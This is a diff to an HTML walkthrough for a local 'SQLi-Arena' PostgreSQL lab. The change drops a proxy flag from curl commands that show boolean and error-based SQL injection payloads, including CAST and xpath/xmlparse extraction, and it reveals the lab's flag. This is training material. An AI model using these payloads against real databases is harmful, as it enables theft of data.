@@ -11,7 +11,7 @@
         <span class="terminal-title">Step 1. Baseline Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=app"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=app"<br><br>
         <span class="prompt">Response: </span>1 | app.name | SQLi-Arena Config Viewer<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 | app.version | 2.4.1
     </div>
@@ -30,9 +30,9 @@
         <span class="terminal-title">Step 2. Injection Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=1 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=1 -- -"<br>
         <span class="prompt">Response: </span>app.name and app.version returned (TRUE condition -- all rows match)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=2 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=2 -- -"<br>
         <span class="prompt">Response: </span>No configuration entries found matching your search. (FALSE condition)
     </div>
 </div>
@@ -50,7 +50,7 @@
         <span class="terminal-title">Step 3. CAST Error Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=CAST((SELECT flag_value FROM hidden_flags LIMIT 1) AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=CAST((SELECT flag_value FROM hidden_flags LIMIT 1) AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_xml_xp4th_1nj3ct}"
     </div>
 </div>
@@ -77,7 +77,7 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">// Build XML doc with embedded secret, extract via xpath, trigger CAST error</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=CAST(xpath('/x', xmlparse(document '&lt;x&gt;'||(SELECT flag_value FROM hidden_flags LIMIT 1)||'&lt;/x&gt;'))::text AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=CAST(xpath('/x', xmlparse(document '&lt;x&gt;'||(SELECT flag_value FROM hidden_flags LIMIT 1)||'&lt;/x&gt;'))::text AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "{&quot;&lt;x&gt;FLAG{pg_xml_xp4th_1nj3ct}&lt;/x&gt;&quot;}"<br><br>
         <span class="prompt">// The xpath() result is an xml[] array, the full XML element is returned with curly braces</span><br>
         <span class="prompt">// The actual flag value is: </span>FLAG{pg_xml_xp4th_1nj3ct}
